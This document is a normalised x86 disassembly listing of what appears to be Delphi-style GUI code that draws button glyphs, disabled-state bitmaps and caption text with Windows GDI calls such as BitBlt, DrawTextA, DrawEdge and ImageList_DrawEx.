push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_437d47
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_41776c
mov eax [ ebp - 0xc ]
call sub_42a3dc
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424f74
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_429ba4
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_41776c
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_437504
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_437490
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_42a3dc
push eax
mov eax [ ebp - 0xc ]
call sub_42a3dc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_4251e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_437434
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_437434
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_437d0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_42a3dc
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424f74
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_42a498
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_42a3dc
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_42a3dc
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_4251e4
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42b1ac
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_42a3dc
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424f74
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_42a3dc
push eax
mov eax [ ebp - 0x14 ]
call sub_42a3dc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_4251e4
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_424f74
mov eax [ ebp - 0x18 ]
call sub_425738
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_42a3dc
call sub_425738
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_42a3dc
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_424f74
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_42a3dc
push eax
mov eax [ ebp - 0x14 ]
call sub_42a3dc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_4251e4
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_424f74
mov eax [ ebp - 0x18 ]
call sub_425738
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_42a3dc
call sub_425738
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4242e8
push eax
mov eax [ ebp - 0x10 ]
call sub_42a3dc
mov eax [ eax + 0x14 ]
pop edx
call sub_424f74
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_42a3dc
push eax
mov eax [ ebp - 0x14 ]
call sub_42a3dc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_4251e4
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424f74
mov eax [ ebp - 0x18 ]
call sub_425738
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_42a3dc
call sub_425738
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42b1ac
mov eax [ ebp - 0xc ]
call sub_42a3dc
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_424f74
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_425318
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_424f74
push 0x0
mov eax ebx
call sub_425738
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_425738
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_42a3dc
call sub_425738
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_425738
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_424f74
push 0x0
mov eax ebx
call sub_425738
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_425738
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_42a3dc
call sub_425738
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_425738
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_42a3dc
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_4247a8
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_42b1ac
mov eax [ ebp - 0x14 ]
call sub_42a3dc
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424f74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4031ec
mov eax [ ebp - 0x14 ]
call sub_4031ec
retn
sub_437d70
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_437798
mov esi eax
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425738
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_462d14
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_4242e8
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425738
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_462d14
push eax
call ImageList_DrawEx
call sub_44ae1c
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_44b0fc
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_462d14
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_425738
push eax
call sub_44ae1c
lea ecx [ ebp - 0x14 ]
pop edx
call sub_44b04c
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_437ed4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_425090
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_40423c
push eax
mov eax esi
call sub_40443c
push eax
mov eax ebx
call sub_425738
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_4247a8
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_40423c
push eax
mov eax esi
call sub_40443c
push eax
mov eax ebx
call sub_425738
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_4247a8
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_40423c
push eax
mov eax esi
call sub_40443c
push eax
mov eax ebx
call sub_425738
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_437fb4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_417744
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_417744
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_417744
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_41776c
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_417744
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_41776c
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_40423c
push eax
mov eax [ ebp + 0x20 ]
call sub_40443c
push eax
mov eax [ ebp - 0x8 ]
call sub_425738
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_417744
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_40423c
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_417744
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_417744
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_417744
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_4382e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_437fb4
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_437d70
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_437ed4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_438350
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_454790
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_438374
push ebx
mov ebx eax
mov eax ebx
call sub_461ee0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4383c0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4383f0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_438ca0
sub_438410
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_438d2c
sub_438430
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_437594
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_438c60
mov ecx esi
xor edx edx
mov eax ebx
call sub_45d584
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_455b78
mov edx 0xff00000f
mov eax ebx
call sub_455bec
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4384f0
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45d5e0
mov eax [ esi + 0x16c ]
call sub_4031ec
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_438528
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_438952
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_425658
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_41776c
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_425738
mov edx eax
mov eax esi
call sub_452ba0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425738
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425738
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_44ae1c
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_44b20c
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_425738
push eax
call sub_44ae1c
lea ecx [ ebp - 0x28 ]
pop edx
call sub_44b008
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425738
push eax
call sub_44ae1c
lea ecx [ ebp - 0x28 ]
pop edx
call sub_44af6c
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_44ae1c
